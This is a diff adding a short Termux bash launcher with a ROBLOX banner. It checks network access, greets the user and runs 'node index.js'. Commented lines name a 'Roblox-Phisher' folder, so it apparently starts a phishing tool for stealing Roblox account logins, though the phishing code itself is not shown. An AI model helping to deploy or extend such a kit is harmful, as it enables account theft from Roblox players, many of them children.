@@ -1,0 +1,40 @@
+#!/bin/bash
+
+# ─╔═══╗─╔═══╗─╔══╗──╔╗────╔═══╗─╔═╗╔═╗
+# ─║╔═╗║─║╔═╗║─║╔╗║──║║────║╔═╗║─╚╗╚╝╔╝
+# ─║╚═╝║─║║─║║─║╚╝╚╗─║║────║║─║║──╚╗╔╝─
+# ─║╔╗╔╝─║║─║║─║╔═╗║─║║─╔╗─║║─║║──╔╝╚╗─
+# ─║║║╚╗─║╚═╝║─║╚═╝║─║╚═╝║─║╚═╝║─╔╝╔╗╚╗
+# ─╚╝╚═╝─╚═══╝─╚═══╝─╚═══╝─╚═══╝─╚═╝╚═╝
+#   Start Script ==> Termux : bash start.sh
+
+whoami=$(command whoami)
+pwd=$(command pwd)
+date_time=$(date "+%Y-%m-%d %H:%M:%S")
+
+start(){
+echo -e "\n[::] Loading Program..."
+timeout 3s curl -fIs "https://www.youtube.com/" > /dev/null
+if [[ $? -eq 0 ]]; then
+echo -e "\n\033[32mUser Conected!\033[37m"
+echo -e "WELCOME!"
+echo -e "Date : $date_time\nUser : $whoami"
+node index.js
+#cd
+#cd Roblox-Phisher
+#bash start.sh
+else
+sleep 0.74
+echo -e ""
+echo -e "\033[33mroblox \033[37mHello $whoami :)"
+echo -e "\033[33mroblox \033[37mSoftware P 8080 $pwd"
+echo -e "\033[33mroblox \033[37mstatus \033[31moff-line\033[37m..."
+sleep 0.2
+echo -e "\033[33mroblox \033[37mErro de Conexão| $date_time"
+sleep 0.2
+echo -e "\033[33mroblox \033[37mVerifique a sua rede wi-fi..."
+start
+fi
+}
+
+start;
